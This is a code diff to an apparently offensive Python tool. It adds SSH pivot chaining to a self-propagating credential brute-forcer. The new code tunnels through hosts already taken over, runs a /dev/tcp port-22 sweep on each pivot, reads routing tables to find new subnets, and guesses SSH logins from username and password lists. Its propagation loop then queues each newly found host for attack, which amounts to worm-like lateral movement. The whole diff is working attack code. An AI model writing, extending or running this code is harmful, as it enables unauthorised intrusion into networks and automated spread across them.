@@ -194,11 +194,239 @@ def brute_force(target: str, delay: float = 0.5, via: str = "direct") -> dict | 
     log(f"  Brute-force failed on {target} after {attempt} attempts", "warn")
     return None
 
+# ── SSH chain utilities (pivot scanning and tunnelled brute-force) ────────────
+def build_ssh_chain(via: str) -> list:
+    """Return ordered [(ip, user, password)] hops from attacker to `via`."""
+    chain = []
+    current = via
+    while current != "direct" and current in compromised:
+        cred = compromised[current]
+        chain.insert(0, (current, cred["user"], cred["password"]))
+        current = cred.get("via", "direct")
+    return chain
+
+
+def scan_network_via_chain(prefix: str, via: str) -> list:
+    """Scan a /24 by running a shell command on the pivot host over SSH."""
+    if prefix in scanned_nets:
+        return []
+    scanned_nets.add(prefix)
+    log(f"Scanning {prefix}0/24 for SSH targets (via {via})...", "info")
+
+    chain = build_ssh_chain(via)
+    if not chain:
+        return []
+
+    # Shell command that runs on the pivot and reports open port-22 hosts
+    ips = " ".join(f"{prefix}{i}" for i in range(1, 50))
+    scan_cmd = (
+        f'for h in {ips}; do '
+        f'(timeout 1 bash -c "exec 3<>/dev/tcp/$h/22" 2>/dev/null && echo $h) & '
+        f'done; wait'
+    )
+
+    last_ip, last_user, last_pwd = chain[-1]
+    cleanup = []
+    try:
+        if len(chain) == 1:
+            client = paramiko.SSHClient()
+            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            client.connect(last_ip, username=last_user, password=last_pwd,
+                           timeout=10, look_for_keys=False, allow_agent=False)
+            cleanup.append(client)
+            _, stdout, _ = client.exec_command(scan_cmd)
+            output = stdout.read().decode(errors='replace')
+        else:
+            ip0, u0, p0 = chain[0]
+            c0 = paramiko.SSHClient()
+            c0.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            c0.connect(ip0, username=u0, password=p0, timeout=10,
+                       look_for_keys=False, allow_agent=False)
+            cleanup.append(c0)
+            transport = c0.get_transport()
+
+            for ip, u, p in chain[1:-1]:
+                ch = transport.open_channel("direct-tcpip", (ip, 22), ("127.0.0.1", 0))
+                t = paramiko.Transport(ch)
+                t.connect(username=u, password=p)
+                cleanup.append(t)
+                transport = t
+
+            # Tunnel to last pivot and run scan there
+            chan = transport.open_channel("direct-tcpip", (last_ip, 22), ("127.0.0.1", 0))
+            t_last = paramiko.Transport(chan)
+            t_last.connect(username=last_user, password=last_pwd)
+            cleanup.append(t_last)
+            session = t_last.open_session()
+            session.exec_command(scan_cmd)
+            output = session.makefile().read()
+            session.close()
+
+        live = [l.strip() for l in output.splitlines()
+                if l.strip() and l.strip().startswith(prefix)]
+        for ip in live:
+            log(f"  OPEN ssh://{ip}:22 (via {via})", "ok")
+        log(f"  Found {len(live)} SSH target(s) on {prefix}0/24", "info")
+        return live
+
+    except Exception as e:
+        log(f"  Pivot scan on {prefix}0/24 via {via} failed: {e}", "warn")
+        return []
+    finally:
+        for obj in reversed(cleanup):
+            try:
+                obj.close()
+            except Exception:
+                pass
+
+
+def get_networks_from_host_via_chain(ip: str, user: str, password: str, via: str) -> list:
+    """Discover network interfaces of a host, reaching it through the SSH chain."""
+    if via == "direct":
+        return get_networks_from_host(ip, user, password)
+
+    chain = build_ssh_chain(via)
+    if not chain:
+        return get_networks_from_host(ip, user, password)
+
+    networks = []
+    cleanup = []
+    try:
+        ip0, u0, p0 = chain[0]
+        c0 = paramiko.SSHClient()
+        c0.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        c0.connect(ip0, username=u0, password=p0, timeout=10,
+                   look_for_keys=False, allow_agent=False)
+        cleanup.append(c0)
+        transport = c0.get_transport()
+
+        for hop_ip, hop_u, hop_p in chain[1:]:
+            ch = transport.open_channel("direct-tcpip", (hop_ip, 22), ("127.0.0.1", 0))
+            t = paramiko.Transport(ch)
+            t.connect(username=hop_u, password=hop_p)
+            cleanup.append(t)
+            transport = t
+
+        chan = transport.open_channel("direct-tcpip", (ip, 22), ("127.0.0.1", 0))
+        t_tgt = paramiko.Transport(chan)
+        t_tgt.connect(username=user, password=password)
+        cleanup.append(t_tgt)
+
+        session = t_tgt.open_session()
+        session.exec_command("ip route 2>/dev/null || route -n 2>/dev/null")
+        output = session.makefile().read()
+        session.close()
+
+        for line in output.splitlines():
+            m = re.search(r'(\d+\.\d+\.\d+)\.\d+', line)
+            if m:
+                prefix = m.group(1) + "."
+                if is_safe_target(prefix + "1") and prefix not in networks:
+                    networks.append(prefix)
+    except Exception as e:
+        log(f"Network discovery from {ip} via chain failed: {e}", "warn")
+    finally:
+        for obj in reversed(cleanup):
+            try:
+                obj.close()
+            except Exception:
+                pass
+    return networks
+
+
+def brute_force_via_chain(target: str, via: str, delay: float = 0.5) -> dict | None:
+    """Brute-force a target by tunnelling through a chain of compromised pivots."""
+    if not HAS_PARAMIKO:
+        return None
+    if target in compromised:
+        return compromised[target]
+
+    chain = build_ssh_chain(via)
+    if not chain:
+        return brute_force(target, delay=delay, via=via)
+
+    log(f"Brute-forcing {target} (via {via})...", "attack")
+
+    # Open stable transport chain to the last pivot (credentials are valid)
+    pivot_cleanup = []
+    pivot_transport = None
+    try:
+        ip0, u0, p0 = chain[0]
+        c0 = paramiko.SSHClient()
+        c0.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        c0.connect(ip0, username=u0, password=p0, timeout=10,
+                   look_for_keys=False, allow_agent=False)
+        pivot_cleanup.append(c0)
+        transport = c0.get_transport()
+
+        for ip, u, p in chain[1:]:
+            ch = transport.open_channel("direct-tcpip", (ip, 22), ("127.0.0.1", 0))
+            t = paramiko.Transport(ch)
+            t.connect(username=u, password=p)
+            pivot_cleanup.append(t)
+            transport = t
+
+        pivot_transport = transport
+    except Exception as e:
+        log(f"  Failed to open pivot chain to {via}: {e}", "warn")
+        for obj in reversed(pivot_cleanup):
+            try:
+                obj.close()
+            except Exception:
+                pass
+        return None
+
+    creds = [(u, p) for u in USERNAMES for p in PASSWORDS]
+    random.shuffle(creds)
+    attempt = 0
+    result = None
+
+    try:
+        for username, password in creds:
+            attempt += 1
+            t_tgt = None
+            try:
+                chan = pivot_transport.open_channel("direct-tcpip", (target, 22), ("127.0.0.1", 0))
+                t_tgt = paramiko.Transport(chan)
+                t_tgt.start_client(timeout=5)
+                try:
+                    t_tgt.auth_password(username, password)
+                    log(f"  [{attempt:03d}] CREDENTIAL FOUND: {username}:{password} @ {target}", "pwned")
+                    cred = {"user": username, "password": password, "via": via, "attempts": attempt}
+                    compromised[target] = cred
+                    result = cred
+                    t_tgt.close()
+                    t_tgt = None
+                    break
+                except paramiko.AuthenticationException:
+                    if attempt % 10 == 0:
+                        log(f"  [{attempt:03d}] FAILED {username}:{password}", "info")
+            except Exception:
+                pass
+            finally:
+                if t_tgt is not None:
+                    try:
+                        t_tgt.close()
+                    except Exception:
+                        pass
+            time.sleep(delay + random.uniform(0, 0.1))
+    finally:
+        for obj in reversed(pivot_cleanup):
+            try:
+                obj.close()
+            except Exception:
+                pass
+
+    if not result:
+        log(f"  Brute-force via chain failed on {target} after {attempt} attempts", "warn")
+    return result
+
+
 # ── Propagation engine ────────────────────────────────────────────────────────
 def propagate(queue: list, delay: float):
     """
     Process a queue of (ip, via_host) pairs.
-    For each: brute-force, then discover new networks from compromised host.
+    For each: brute-force (direct or via SSH chain), then discover new networks.
     """
     while queue:
         target_ip, via = queue.pop(0)
@@ -206,18 +434,25 @@ def propagate(queue: list, delay: float):
         if target_ip in compromised:
             continue
 
-        cred = brute_force(target_ip, delay=delay, via=via)
+        if via == "direct":
+            cred = brute_force(target_ip, delay=delay, via=via)
+        else:
+            cred = brute_force_via_chain(target_ip, via=via, delay=delay)
+
         if not cred:
             continue
 
-        # From compromised host, discover new reachable networks
+        # Discover networks reachable from the newly compromised host
         log(f"Discovering networks from compromised {target_ip}...", "pivot")
-        new_nets = get_networks_from_host(target_ip, cred["user"], cred["password"])
+        new_nets = get_networks_from_host_via_chain(
+            target_ip, cred["user"], cred["password"], via
+        )
 
         for net in new_nets:
             if net not in scanned_nets:
                 log(f"  New network discovered: {net}0/24 (via {target_ip})", "pivot")
-                new_targets = scan_network(net)
+                # Scan the new network from target_ip's perspective
+                new_targets = scan_network_via_chain(net, target_ip)
                 for t in new_targets:
                     if t not in compromised and t != target_ip:
                         queue.append((t, target_ip))
